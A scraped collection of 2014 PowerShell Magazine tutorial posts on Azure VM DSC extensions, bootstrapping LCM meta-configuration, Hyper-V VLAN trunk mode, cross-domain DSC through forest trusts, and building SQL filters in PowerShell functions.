New-AzureStorageContext -StorageAccountName $StorageAccount -StorageAccountKey $StorageKey Publish-AzureVMDscConfiguration -ConfigurationPath .\\LCMConfiguration.ps1 -ContainerName $StorageContainer -StorageContext $StorageContext -Force #Set the Azure VM DSC Extension to run the LCM meta-configuration $vmAzureExtension = Set-AzureVMDscExtension -VM $vmProvisioningConfig -ConfigurationArchive LCMConfiguration.ps1.zip -ConfigurationName LCMConfiguration -Verbose -StorageContext $StorageContext -ContainerName $StorageContainer -Force #Create a VM New-AzureVM -ServiceName $ServiceName -VMs $vmAzureExtension In the above script, the Set-AzureVMDscExtension returns the VM object with the VM provisioning configuration specified using the Add-AzureProvisioningConfig cmdlet. We finally provide that VM object to create a new Azure VM. Once the VM creation is complete, the VM DSC extension gets installed and the LCM meta-configuration gets enacted.\nBootstrapping DSC Configuration Bootstrapping DSC resource configuration is not any different from the process we just saw. Here is a sample configuration script that contains one custom DSC resource from the resource kit.\nConfiguration AzureVMConfiguration { Import-DscResource -ModuleName xSystemSecurity Node Localhost { File DscFile { Type = \u0026quot;Directory\u0026quot; Ensure = \u0026quot;Present\u0026quot; DestinationPath = \u0026quot;C:\\Scripts\u0026quot; } WindowsFeature DscService { Name = \u0026quot;DSC-Service\u0026quot; Ensure = \u0026quot;Present\u0026quot; } xIEESc DscIE { UserRole = \u0026quot;Users\u0026quot; IsEnabled = $false } } }  I saved the above configuration script as AzureVMConfiguration.ps1 and published the configuration using the Publish-AzureVMDscConfiguration cmdlet. As I’d explained in an earlier article, when we publish a configuration script, any custom DSC resources imported using the Import-DscResource cmdlet get packaged as an archive along with the configuration script and get uploaded to the storage account. This is the advantage of using VM DSC extension instead of custom script extension.\n#Set the Azure subscription $SubscriptionName = \u0026quot;MyCloud\u0026quot; Select-AzureSubscription -SubscriptionName $SubscriptionName #Replace the variable values as needed $ServiceName = \u0026quot;psdsc\u0026quot; $Location = \u0026quot;Southeast Asia\u0026quot; $VMName = \u0026quot;CSETest\u0026quot; $StorageAccount = 'psdsc' $StorageKey = 'storagekey' $StorageContainer = 'dscarchives' #Get the OS image reference $ImageName = (Get-AzureVMImage | Where { $_.ImageFamily -eq \u0026quot;Windows Server 2012 R2 Datacenter\u0026quot; } | sort PublishedDate -Descending | Select-Object -First 1).ImageName #Create VM Config $vmConfig = New-AzureVMConfig -Name $VMName -ImageName $ImageName -InstanceSize Small #Create Provisioning Configuration $vmProvisioningConfig = Add-AzureProvisioningConfig -VM $vmConfig -Windows -AdminUsername \u0026quot;AdminUser\u0026quot; -Password \u0026quot;P@ssw0rd\u0026quot; $StorageContext = New-AzureStorageContext -StorageAccountName $StorageAccount -StorageAccountKey $StorageKey Publish-AzureVMDscConfiguration -ConfigurationPath .\\AzureVMConfiguration.ps1 -ContainerName $StorageContainer -StorageContext $StorageContext -Force #Set the Azure VM DSC Extension to run the LCM meta-configuration $vmAzureExtension = Set-AzureVMDscExtension -VM $vmProvisioningConfig -ConfigurationArchive AzureVMConfiguration.ps1.zip -ConfigurationName AzureVMConfiguration -Verbose -StorageContext $StorageContext -ContainerName $StorageContainer -Force #Create a VM New-AzureVM -ServiceName $ServiceName -VMs $vmAzureExtension The overall process of bootstrapping the DSC resource configuration along with the creation of a new Azure VM is shown above. At the end of this VM creation, you will have the DSC resources configured as per the configuration script. With this handy, there are many advanced scenarios we can enable with the help of DSC extension and a little bit of PowerShell!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/07/bootstrapping-dsc-configuration-using-azure-vm-dsc-extension/","tags":["Azure","PowerShell DSC"],"title":"Bootstrapping DSC configuration using Azure VM DSC extension"},{"categories":["Tips and Tricks","Hyper-V"],"contents":"With the introduction of Hyper-V in Windows Server 2012, the Hyper-V Extensible Switch became available providing more functionality than previous versions. One of the new features was support for VLAN trunk mode, making it possible for a virtual machine to see traffic from multiple VLANs. This might be a need for virtual machines running network services such as a reverse proxy.\nConfiguring trunk mode for a virtual network adapter is not supported from the Hyper-V Manager; only a single VLAN can be configured:\nIn order to configure trunk mode, we can use the Hyper-V PowerShell module:\nSet-VMNetworkAdapterVlan –VMName DemoVM –Trunk –AllowedVlanIdList 1000-1050 –NativeVlanId 1000 The above example will enable the virtual machine DemoVM to send and receive traffic on VLAN 1000 to 1050. If no VLAN is specified in the network packet, it will be processed on VLAN 1000.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/06/configuring-trunk-mode-in-hyper-v/","tags":["Tips and Tricks","Hyper-V"],"title":"#PSTip Configuring trunk mode in Hyper-V"},{"categories":["Azure","PowerShell DSC"],"contents":"The Azure team released the Azure PowerShell Tools version 0.8.6 that includes cmdlets for working with a new Azure VM extension called DSC extension. Using DSC extension, we can push configuration to an Azure VM. In an earlier article, I’d written about boot-strapping DSC meta-configuration (LCM) in an Azure VM using the custom script extension. Now, with this new DSC extension, sending DSC configuration (either meta or not) is much more straightforward. In this article, I will explain how to use this new extension.\nPrerequisites First of all, to be able to use the Azure VM DSC extension, you’d need Azure PowerShell Tools version 0.8.6. Second, I assume that you have an existing Azure storage account that can be used to upload the DSC configuration archives. If not, create one and a container within it.\nKnown Issues It is good to know these issues upfront before you proceed further.\n#1. Do not include -Name parameter with the Import-DscResource in the DSC configuration script. This will result in an error when you try the Publish-AzureVMDscConfiguration cmdlet. I logged this as an issue.\n#2. If the Azure VM is configured as a DSC pull client, using Set-AzureVMDscExtension will not enact the configuration. I see no way of force pushing a configuration to a Azure VM that is a pull client. I submitted this as a feature request.\n#3. The Set-AzureVMDscExtension cmdlet’s help content does not tell you that the Update-AzureVM needs to be run. This is a documentation bug.\nIntroducing Azure VM DSC extension When you install the 0.8.6 version of Azure PowerShell Tools, you can see new DSC extension-related cmdlets.\nThere are four cmdlets for this extension.\n Get-AzureVMDscExtension provides a way to get the settings of the DSC extension from the Azure VM. Set-AzureVMDscExtension configures the DSC extension in an Azure VM. Publish-AzureVMDscConfiguration packs the configuration script and the required modules and uploads the zip archive to the specified Azure storage account. Remove-AzureVMDscExtension removes or disables the DSC extension in an Azure VM.  The Process Before we can enact DSC configuration in an Azure VM, we need to publish that configuration to an Azure storage container. This can be done using the _Publish-AzureVMDscConfiguration _cmdlet. For the demonstration purposes, I will use the following configuration script:\nConfiguration AzureDscDemo { Import-DscResource -ModuleName xSystemSecurity Node Localhost { File DscFile { Type = \u0026quot;Directory\u0026quot; Ensure = \u0026quot;Present\u0026quot; DestinationPath = \u0026quot;C:\\Scripts\u0026quot; } WindowsFeature DscService { Name = \u0026quot;DSC-Service\u0026quot; Ensure = \u0026quot;Present\u0026quot; } xIEESc DscIE { UserRole = \u0026quot;Users\u0026quot; IsEnabled = $false } } }  If you observe the above configuration script, I am using a custom DSC resource in the node configuration and therefore importing the resource module using the Import-DscResource cmdlet.\nThe configuration script needs to be saved as a .PS1 file on the local system before we can use the Publish-AzureVMDscConfiguration cmdlet. I saved it as AzureVMConfiguration.ps1.\nPublishing Azure Configuration The Publish-AzureVMDscConfiguration cmdlet can be used to either generate \u0026amp; upload the configuration archive to the Azure storage account or generate the archive and store it locally. In the first case, we can explicitly specify where the configuration archive should be stored. Otherwise, the cmdlet creates a storage container named windows-powershell-dsc in the storage account you have and upload the zip archive to that account.\nPublish-AzureVMDscConfiguration -ConfigurationPath .\\AzureVMConfiguration.ps1  If you have multiple storage accounts, this cmdlet uses the current storage account set either using the Set-AzureSubscription cmdlet or the Set-AzureStorageAccount cmdlet. So, what’s inside this zip archive? It contains the configuration script that we created as well as any modules imported in the configuration script using the Import-DscResource cmdlet. If you do not want the cmdlet to upload the archive to a storage container, you can use the -ConfigurationArchivePath parameter to specify a local folder where the generated zip archive can be stored.\nPublish-AzureVMDscConfiguration -ConfigurationPath .\\AzureVMConfiguration.ps1 -ConfigurationArchivePath .\\AzureVMConfiguration.ps1.zip  In my configuration script, I have used xIEESC DSC resource which is a part of the xSystemSecurity module. Therefore, the archive that is generated on my system has the configuration script as well as the xSystemSecurity module folder.\nIf you want to explicitly specify where the configuration archive must be uploaded, you can use the -ContainerName parameter. The container will be created if it does not already exist.\nPublish-AzureVMDscConfiguration -ConfigurationPath .\\AzureVMConfiguration.ps1 -ContainerName \"dscarchives\"  And, finally, if you need to upload the configuration archive to a storage account that requires authorization, you can use the -StorageContext parameter to provide the Azure Storage account context.\n$StorageAccount = 'psdsc' $StorageKey = 'StorageKey' $StorageContainer = 'dscarchives' $StorageContext = New-AzureStorageContext -StorageAccountName $StorageAccount -StorageAccountKey $StorageKey Publish-AzureVMDscConfiguration -ConfigurationPath .\\AzureVMConfiguration.ps1 -ContainerName $StorageContainer -StorageContext $StorageContext When providing the storage context, you must provide the access key for the storage account. Once again, the container will be created if it does not exist.\nSetting Azure VM DSC extension For enabling and enacting the configuration, we can use the Set-AzureVMDscExtension cmdlet. For using this cmdlet, we need to specify the configuration archive name that is uploaded to the storage account and the name of the configuration command or the identifier used for the configuration command. If you have used a different storage account and container name for the archive upload, you need to specify those details as well. The Azure VM object is specified using the -VM parameter.\n$vm = Get-AzureVM -ServiceName psdsc -Name CSETest Set-AzureVMDscExtension -VM $vm -ConfigurationArchive AzureVMConfiguration.ps1.zip -ConfigurationName AzureDscDemo -Verbose -StorageContext $StorageContext -ContainerName $StorageContainer | Update-AzureVM At this point, WMF 5.0 July 2014 release gets installed on the Azure VM. This requires a reboot and the Azure VM gets rebooted after the install. Once the VM comes back online, the configuration gets downloaded from the storage account as pending.mof and gets applied.\nIf your configuration script requires any parameters, you can pass them as a hash table using the -ConfigurationArgument parameter. The -ConfigurationDataPath can be used to specify the path to a .PSD1 file that contains the DSC configuration data. The following code snippet shows how the configuration data needs to be written. This is just a sample and you can refer to Technet documentation for a detailed example.\n@{ AllNodes = @( @{ NodeName = \u0026quot;localhost\u0026quot;; ScriptPath = \u0026quot;C:\\Scripts\u0026quot;; } ) } You need to save this as a .PSD1 file and specify the path to it as an argument to -ConfigurationDataPath parameter. This PSD1 file gets uploaded to the storage account to the same container as the configuration script archive. Of course, you need to modify the configuration script to use the configuration data we provide as a PSD1 file. And, whenever you modify the configuration script, it needs to be published again using the Publish-AzureVMDscConfiguration cmdlet.\n$vm = Get-AzureVM -ServiceName psdsc -Name CSETest Set-AzureVMDscExtension -VM $vm -ConfigurationArchive AzureVMConfiguration.ps1.zip -ConfigurationName AzureVMConfiguration -Verbose -StorageContext $StorageContext -ContainerName $StorageContainer -Force -ConfigurationDataPath 'ConfigData.psd1' | Update-AzureVM This is it. You can use the Get-AzureVMDscExtension cmdlet to get the extension settings.\n$vm = Get-AzureVM -ServiceName psdsc -Name CSETest Get-AzureVMDscExtension -VM $vm  But, how do we access the DSC configuration details from this Azure VM? Simple. We can use CIM sessions and the Get-DscConfiguration cmdlet.\n$cimsessionoption = New-CimSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck -UseSsl $cimsession = New-CimSession -Credential (Get-Credential -UserName \u0026quot;AdminUser\u0026quot; -Message \u0026quot;Password\u0026quot;) -ComputerName psdsc.cloudapp.net -Port 5986 -SessionOption $cimsessionoption Get-DscConfiguration -CimSession $cimsession Removing DSC extension Finally, we can remove the Azure VM DSC extension using the Remove-AzureVMDscExtension cmdlet.\nRemove-AzureVMDscExtension -VM $vm -Verbose | Update-AzureVM Note that this command will only disable the Azure VM DSC extension and does not remove the configuration changes done using DSC from the target Azure VM.\nIn the subsequent articles, we will look at how we can use this extension to bootstrap a new Azure VM.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/05/understanding-azure-vm-dsc-extension/","tags":["Azure","PowerShell DSC"],"title":"Understanding Azure VM DSC Extension"},{"categories":["News","Azure"],"contents":"The Azure PowerShell Tools are updated very often. But, this 0.8.6 release, is special and has many features that I was looking forward to. This release has the new Azure VM DSC extension cmdlets, non-interactive login using Add-AzureAccount, a new set of cmdlets for Windows Azure Pack, and so on.\nHere is a list of new features and bug fixes in this release:\n Non-interactive login support for Microsoft Organizational account with Add-AzureAccount -Credential Upgrade cloud service cmdlets dependencies to Azure SDK 2.4 Compute  PowerShell DSC VM extension  Get-AzureVMDscExtension Remove-AzureVMDscExtension Set-AzureVMDscExtension Publish-AzureVMDscConfiguration   Added CompanyName and SupportedOS parameters to Publish-AzurePlatformExtension New-AzureVM will display a warning instead of an error when the service already exists in the same subscription Added Version parameter to generic service extension cmdlets Changed the ShowInGUI parameter to DoNotShowInGUI in Update-AzureVMImage   SQL Database  Added OfflineSecondary parameter to Start-AzureSqlDatabaseCopy Database copy cmdlets will return 2 more properties: IsOfflineSecondary and IsTerminationAllowed   Windows Azure Pack  New-WAPackCloudService Get-WAPackCloudService Remove-WAPackCloudService New-WAPackVMRole Get-WAPackVMRole Set-WAPackVMRole Remove-WAPackVMRole New-WAPackVNet Remove-WAPackVNet New-WAPackVMSubnet Get-WAPackVMSubnet Remove-WAPackVMSubnet New-WAPackStaticIPAddressPool Get-WAPackStaticIPAddressPool Remove-WAPackStaticIPAddressPool Get-WAPackLogicalNetwork    I will write more about the Azure VM DSC extension in an upcoming article.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/08/05/azure-powershell-tools-version-0-8-6-is-available/","tags":["Azure","News"],"title":"Azure PowerShell Tools version 0.8.6 is available"},{"categories":["Tips and Tricks","SQL"],"contents":"Note: This tip requires PowerShell 3.0 or later.\nFiltering information retrieved from SQL database should not be limited to text filters only. Sometimes we may want to use dates to filter out some records. Other times we may want to get only records with some numeric value higher/lower than value specified. To cover wider range of filters we will need a bit smarter logic for producing complete query.\nLet’s start with dates. Our database has two fields that contain DateTime value: StartDate and EndDate. Suppose we want to have switches that will cover situations when date is either in the future or in the past:\nparam ( # ... other parameters ... # Retrieves new-hire employees. [Parameter( ParameterSetName = 'list' )] [switch]$BeforeStartDate, # Retrieves currently hired employees. [Parameter( ParameterSetName = 'list' )] [switch]$BeforeEndDate, # Retrieves employees that were already hired. [Parameter( ParameterSetName = 'list' )] [switch]$AfterStartDate, # Retrieves laid off employees. [Parameter( ParameterSetName = 'list' )] [switch]$AfterEndDate )  All parameters match the same pattern: time relation (After/Before) followed by table column name. Therefore we will use -Regex switch to identify either scenario. As we still want to be able to support our ‘translated’ columns, we will need to generate appropriate pattern for that scenario too:\n$mappedParameters = '^({0})$' -f ($parameterMap.Keys -join '|') $queryList = New-Object System.Collections.ArrayList switch -Regex ($PSBoundParameters.Keys) { $mappedParameters { $wildcard = [System.Management.Automation.WildcardPattern]$PSBoundParameters[$_] $wql = $wildcard.ToWql() $item = \u0026quot;[{0}] LIKE '{1}'\u0026quot; -f $parameterMap[$_], $wql $queryList.Add($item) | Out-Null } ^Before { $field = $_ -replace '^Before' $item = \u0026quot;[{0}] \u0026amp;gt; '{1}'\u0026quot; -f $field, (Get-Date) $queryList.Add($item) | Out-Null } ^After { $field = $_ -replace '^After' $item = \u0026quot;[{0}] \u0026amp;lt; '{1}'\u0026quot; -f $field, (Get-Date) $queryList.Add($item) | Out-Null } }  There is also nothing that would prevent us from doing both things at the same time: use different filter than LIKE and be able to map SQL columns to friendly parameters/properties of output object. For example: we add two parameters that enable filtering on Id property (that maps to ‘Employee Id’ column): IdLowerThan and IdGreaterThan. Code that would create appropriate filter for us:\nswitch -Regex ($PSBoundParameters.Keys) { # ... GreaterThan$ { $fieldMappedTo = $_ -replace 'GreaterThan$' $field = $parameterMap[$fieldMappedTo] $item = '[{0}] \u0026amp;gt; {1}' -f $field, $PSBoundParameters[$_] $queryList.Add($item) | Out-Null } LowerThan$ { $fieldMappedTo = $_ -replace 'LowerThan$' $field = $parameterMap[$fieldMappedTo] $item = '[{0}] \u0026amp;lt; {1}' -f $field, $PSBoundParameters[$_] $queryList.Add($item) | Out-Null } }  Using switch statement makes it easy to extend our reach for any scenario we can think of. We just need to be sure that we name our parameters in a way that makes it possible to identify all options.\nNote: Complete function that has all the bells and whistles can be found here.\nExample use case: find new hires that have Id lower than 7:\nGet-EmployeeData -BeforeStartDate -IdLowerThan 7 | Format-Table -AutoSize Department StartDate EndDate SamAccountName Description Id Surname Title GivenName ---------- --------- ------- -------------- ----------- -- ------- ----- --------- Facilities 10-Jan-15 00:00:00 04-Jan-22 00:00:00 ABeans Security in building 4 6 Beans Security Officer Adam ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/31/pstip-functions-and-sql-filtering-part-4/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Functions and SQL filtering, Part 4"},{"categories":["Tips and Tricks","SQL"],"contents":"Note: This tip requires PowerShell 3.0 or later.\nWhenever we retrieve information from SQL database we are faced with the problem: are we happy with column names defined in database schema? We may change these names relatively easily using appropriate T-SQL query, but what about parameters on our command when we do that? Will end user know how parameter name maps to object properties? Maybe it would be best to have parameter names that match properties of output object? This way filtering becomes natural.\nAnother problem: we don’t want to have spaces (or other special characters, for that matter) in the names of properties of our object. It would be great to rename these to something that will be practical when operating on resulting collection–grouping, sorting…\nIt should not be a surprise that in my opinion element in PowerShell that is best for mapping/ translating strings is a hash table. We will define such hash table that will map object properties (hash table keys) to corresponding table names (hash table values):\n$parameterMap = @{ GivenName = 'First Name' Surname = 'Last Name' Description = 'User Information Detailed' Title = 'Title' SamAccountName = 'Login' Id = 'Employee Id' } Next, we will check if any of bound parameters is present in our mapping dictionary:\n$queryList = New-Object System.Collections.ArrayList switch ($PSBoundParameters.Keys) { { $parameterMap.Keys -contains $_ } { $wildcard = [System.Management.Automation.WildcardPattern]$PSBoundParameters[$_] $wql = $wildcard.ToWql() $item = \u0026quot;[{0}] LIKE '{1}'\u0026quot; -f $parameterMap[$_], $wql $queryList.Add($item) | Out-Null } } $Filter = $queryList -join ' AND ' We use ‘safe’ syntax for column names: surrounding them with square brackets prevents syntax errors caused by spaces in names. With this code we’ve managed to translate our parameter names to columns, and parameter values to patterns that can be used in SQL queries. But we also want to be sure that parameter names will match names of properties of produced object. To get there we need to build proper select statement:\n$selectList = foreach ($key in $parameterMap.Keys) { \u0026quot;[{0}] AS '{1}'\u0026quot; -f $parameterMap.$key, $key } $select = $selectList -join ', ' Once we update our Get-EmployeeData function with changes mentioned above we will get a tool, that works very well with New-ADUser cmdlet from ActiveDirectory module. As this cmdlet accepts most of the parameters used to create new user as ValueFromPipelineByPropertyName, we can just pipe results from our function to it. There is one exception: we don’t have Name property. But if we agree on certain pattern for that attribute, we can solve it by passing script block to this parameter:\nGet-EmployeeData -Title *Windows* | New-ADUser -Name { '{0}{1}' -f $_.GivenName, $_.Surname } -WhatIf What if: Performing the operation \u0026ldquo;New\u0026rdquo; on target \u0026ldquo;CN=PaulSmith,CN=Users,DC=bielawscy,DC=com\u0026rdquo;.\nNote: You can find Get-EmployeeData function here.\nOur function is very close to complete tool. One last thing that is missing is an option to use filters other than LIKE. Our database contains information about StartDate/EndDate that we may want to use to limit the results. We will try to address this in fourth and final part of the series. Stay tuned!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/30/pstip-functions-and-sql-filtering-part-3/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Functions and SQL filtering, Part 3"},{"categories":["PowerShell DSC"],"contents":"Most of the DSC examples we have seen so far here or elsewhere focused on single domain scenarios. However, in a real-world deployment, we have mixed domains and even a few systems that are probably in a workgroup configuration. In this article, we will see what is needed to use DSC in a mixed domain environment.\nWe understand that DSC depends on CIM and WSMAN. When we push configuration to a target system, by default, we are using WinRM HTTP port (5895). We can configure HTTPS listeners too but let us keep that out for now. It is important to understand the configuration required to push configurations from a system in one domain to target systems in another domain. This scenario is what we refer as cross-domain configuration management.\nFor demonstration purposes, I will use the following configuration. I have two domains named DSCDemo and DSCDemo2. These are two different AD forests. In this scenario, DSCDemo is the account domain and DSCDemo2 is the resource domain.\nIf we use default settings, a cross-domain configuration management using the Start-DscConfiguration cmdlet fails with a WinRM error. We will use the following configuration script for all the examples in this article.\nConfiguration Demo { Node WSR2-4.DSCDemo2.lab { File TestFile { DestinationPath = \u0026quot;C:\\Scripts\\Test.txt\u0026quot; Contents = \u0026quot;\u0026quot; Ensure = \u0026quot;Present\u0026quot; } } } If we push this configuration from a system in DSCDemo domain, it will fail.\nThere are a couple of methods we can use to perform cross-domain configuration management:\n Using -Credential parameter of the Start-DscConfiguration cmdlet Creating a AD forest trust and configuring appropriate user permissions  Using Credentials Using the -Credential parameter is the most easiest way to resolve the errors we see in mixed domain environments.\nStart-DscConfiguration -Path .\\Demo -Wait -Verbose -Credential (Get-Credential -UserName DSCDemo2\\Administrator -Message \u0026quot;Password\u0026quot;) However, the ideal method is to create a trust between the AD forests and configure appropriate permissions so that the domain administrators from the account domain can push configuration to systems in a resource domain.\nUsing AD trust relationship For this demo purpose, I created a two-way forest trust between the local and remote forests.\n$Cred = Get-Credential $RemoteForest = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest','DSCDemo2.lab',$cred.UserName,$Cred.GetNetworkCredential().Password) $RemoteForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($RemoteForest) $LocalForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest() $LocalForest.CreateTrustRelationship($RemoteForestObject,'Bidirectional') Creating a forest trust alone isn’t enough. You need to ensure that the name suffix routing is enabled and the DNS server in the account domain is configured to forward the name resolution requests for all systems in the resource domain, if there is no shared root DNS.\nWhen the forest trust is established and verified, we can configure the domain administrator user account permissions. This is what you need to perform:\n Create a Domain local security group in the resource domain (DSCDemo2 in our example). Add Domain Admins group from account domain as a member of domain local group created in step 1. Create a group policy in the resource domain to add the group created in step 1 as a member of local administrators group of all systems in the resource domain.  The first two steps are trivial and don’t need a lot of explanation. For the third step, I will show the configuration settings from my example.\nThis is it. Once this GPO is enforced, we should be able to push configurations from the account domain to the resource domain without explicitly providing any credentials.\nFollowing the same steps, you can expand this to any number of domains in an enterprise environment. All this configuration is required only for pushing configuration. Pull configuration delivery model doesn\u0026rsquo;t need these additional configuration steps. In a large enterprise Active Directory environment, pull configuration delivery is recommended way to implement DSC.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/30/cross-domain-configuration-management-with-dsc/","tags":["PowerShell DSC"],"title":"Cross-domain configuration management with DSC"},{"categories":["Tips and Tricks","SQL"],"contents":"Note: This tip requires PowerShell 3.0 or later.\nAdding support for easy filtering on individual table columns is great, but the fact that user would have to use SQL wildcard syntax rather than wildcards that he is used to, makes it feel like a partial solution. There are two options to solve this problem: first of all, we can try to parse string passed to parameter and convert it to something that SQL would understand:\n$Wildcard = '*Value_That_Ne?ds_some%Escaping*' # Escape '%' and '_' $Wildcard = $Wildcard -replace '(%|_)', '[$1]' # Replace '*' with '%' and '?' with '_' $Wildcard = $Wildcard -replace '\\*', '%' $Wildcard = $Wildcard -replace '\\?', '_' The second option requires PowerShell 3.0. To get correct results we will use ToWql() method on objects of type System.Management.Automation.WildcardPattern:\n$Wildcard = '*Value_That_Ne?ds_some%Escaping*' $Wildcard = [System.Management.Automation.WildcardPattern]$Wildcard $Wildcard.ToWql() %Value[_]That[_]Ne_ds[_]some[%]Escaping% To make it more obvious for end user that our function supports wildcards we can use another feature that was introduced in PowerShell 3.0: [SupportsWildcard()] attribute. Our revised Get-EmployeeData function (for clarity with just one parameter set):\n#requires -version 3.0 function Get-EmployeeData { \u0026lt;# .Synopsis Function to get employee data from SQL database. #\u0026gt; [CmdletBinding()] param ( # Employee first name [SupportsWildcards()] [string]$FirstName, # Employee last name [SupportsWildcards()] [string]$LastName ) $queryList = New-Object System.Collections.ArrayList foreach ($key in $PSBoundParameters.Keys) { if ($key -match 'FirstName|LastName') { $wildcard = [System.Management.Automation.WildcardPattern]$PSBoundParameters[$key] $wql = $wildcard.ToWql() $item = \u0026quot;{0} LIKE '{1}'\u0026quot; -f $key, $wql $queryList.Add($item) | Out-Null } } $Filter = $queryList -join ' AND ' $Query = @\u0026quot; SELECT FirstName, LastName, Department, Title, StartDate, EndDate FROM Employees WHERE $Filter \u0026quot;@ $Query } With these changes we can use more natural syntax when looking for records in SQL source:\nGet-EmployeeData -FirstName *Jo* -LastName Do* SELECT FirstName, LastName, Department, Title, StartDate, EndDate FROM Employees WHERE FirstName LIKE '%Jo%' AND LastName LIKE 'Do%'  It is also clear for the end user that we support this syntax as soon as he will request a help for any parameter we’ve defined with wildcards in mind:\nGet-Help Get-EmployeeData -Parameter LastName -LastName \u0026lt;String\u0026gt; Employee last name Required? false Position? 2 Default value Accept pipeline input? false Accept wildcard characters? true  Our function is slowly starting to look like real PowerShell tool. In the next part we will extend it to support situation when we want to name PowerShell object properties differently than SQL table columns. Stay tuned!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/29/pstip-functions-and-sql-filtering-part-2/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Functions and SQL filtering, Part 2"},{"categories":["Azure","PowerShell DSC"],"contents":"I have been a very active user of DSC both in the lab and on all my Azure VMs. One of the things I always do is to configure my Azure VMs to get configuration from a pull service hosted in my Azure subscription. I want these Azure VMs to have the custom meta-configuration as soon as they get created. The custom script extension for the Azure VMs can be used to do this. However, this is not as straightforward as using the Set-DscLocalConfigurationManager cmdlet. In this article, I will explain the method to achieve this and explain each step in this process. You can use these steps to bootstrap configuration other than meta-configuration too.\nIn an earlier article, I wrote about custom script extension in Azure. The custom script extension lets us run PowerShell scripts in a Azure VM. If you have used the Azure Management portal recently to create a VM from the gallery, you must have noticed the change in the VM configuration page.\nWe can select a script (ps1) file from either the local storage or Azure storage and run it after the VM provisioning is complete. We can specify arguments to the script using the arguments textbox shown in the VM configuration screen. I use this method to bootstrap my Azure VMs with the LCM configuration required for my deployment. This method can be used to trigger configuration pull as well. We will see that towards the end of this article.\nAutomating LCM meta-configuration Let us start by looking at the script that generates and applies the meta-configuration. We will understand how this works before we proceed to create an Azure VM that uses this script.\nparam ( [guid]$ConfigurationId = [guid]::NewGuid().Guid, [string]$PullServerUrl ) Configuration LCMConfig { Node $env:COMPUTERNAME { LocalConfigurationManager { ConfigurationID = \u0026quot;$ConfigurationId\u0026quot; RefreshMode = \u0026quot;Pull\u0026quot; DownloadManagerName = \u0026quot;WebDownloadManager\u0026quot; DownloadManagerCustomData = @{ServerUrl=$PullServerUrl;AllowUnSecureConnection='True'} } } } $mof = LCMConfig #Create a CIM Session to the localhost #Need to skip CA and CN checks $CimSessionOption = New-CimSessionOption -SkipCNCheck -SkipCACheck -UseSsl $CimSession = New-CimSession -ComputerName $env:COMPUTERNAME -Port 5986 -SessionOption $CimSessionOption #Invoke Set-DscLocalConfigurationManager Set-DscLocalConfigurationManager -CimSession $CimSession -Path $mof.Directory.FullName I have copied this script to one of my Azure storage containers as LCM.ps1. Let us dissect the script now.\nWe have a Configuration script block that is used to specify the LCM meta-configuration. Through this, we are configuring the LCM as a pull client to a REST-based pull service. This pull service is also hosted on Azure and is a HTTP endpoint. So, I am setting the AllowUnSecureConnection to True. The values for the ConfigurationId and ServerUrl within the DownloadManagerCustomData are passed as the script arguments. Once we have the Configuration command, we run the same and store the MOF file object in $mof.\nIn a normal scenario, we can use Set-DscLocalConfigurationManager cmdlet with just the -Path parameter to apply the meta-configuration in the generated MOF file. However, this won’t work in a Azure VM for two reasons:\n The default WinRM endpoint is HTTPS-based. So, we need to create a CIM session and use the SSL endpoint and 5896 port number. Although it is possible to provision a HTTP-based WinRM endpoint using Azure PowerShell cmdlets, I prefer using the HTTPS endpoints in the VM. The certificate deployed for WinRM endpoint uses the cloud service name as the subject name. So, even if we use CIM session with SSL, the enact process would fail because the local host name would not match the certificate’s subject name.  This is what we solved in the script by creating CIM session options and a CIM session. The -SkipCNCheck and -SkipCACheck parameters of the New-CimSessionOption cmdlet ensure that the certificate’s subject name gets ignored. We, then, create a CIM session that uses the CIM session options. Finally, we use the -CimSession parameter of the Set-DscLocalConfigurationManager cmdlet to enact this meta-configuration.\nBootstrapping LCM meta-configuration Now that we understand the method for automating LCM meta-configuration, let us see how we can boot strap this configuration in an Azure VM as it gets created. First of all, make sure you copy the above script to one of the containers in your Azure storage account. In the following script, we will use the Azure custom script extension to execute the LCM configuration script in the Azure VM.\n$SubscriptionName = \u0026quot;MyCloud\u0026quot; Select-AzureSubscription -SubscriptionName $SubscriptionName $ServiceName = \u0026quot;psdsc\u0026quot; $Location = \u0026quot;Southeast Asia\u0026quot; $VMName = \u0026quot;CSETest\u0026quot; $StorageAccountName = \u0026quot;psdsc\u0026quot; $StorageContainerName = \u0026quot;scripts\u0026quot; #Create a new cloud service Set-AzureSubscription -SubscriptionName $SubscriptionName -CurrentStorageAccountName $StorageAccountName New-AzureService -ServiceName $ServiceName -Location $Location #Get the OS image reference $ImageName = (Get-AzureVMImage | Where { $_.ImageFamily -eq \u0026quot;Windows Server 2012 R2 Datacenter\u0026quot; } | sort PublishedDate -Descending | Select-Object -First 1).ImageName #Create VM Config $vmConfig = New-AzureVMConfig -Name $VMName -ImageName $ImageName -InstanceSize Small #Create Provisioning Configuration $vmProvisioningConfig = Add-AzureProvisioningConfig -VM $vmConfig -Windows -AdminUsername \u0026quot;AdminUser\u0026quot; -Password \u0026quot;Password\u0026quot; #Set the Azure Script Extension to run the LCM meta-configuration $vmAzureExtension = Set-AzureVMCustomScriptExtension -FileName LCM.ps1 -VM $vmProvisioningConfig -ContainerName $StorageContainerName -StorageAccountName $StorageAccountName -Argument \u0026quot;-PullServerUrl http://dscdemo.cloudapp.net:8080/PullSvc/DscPullService.svc\u0026quot; #Create a VM New-AzureVM -ServiceName $ServiceName -VMs $vmAzureExtension While creating the VM using above script, make sure you use the same location for all the components in the deployment. 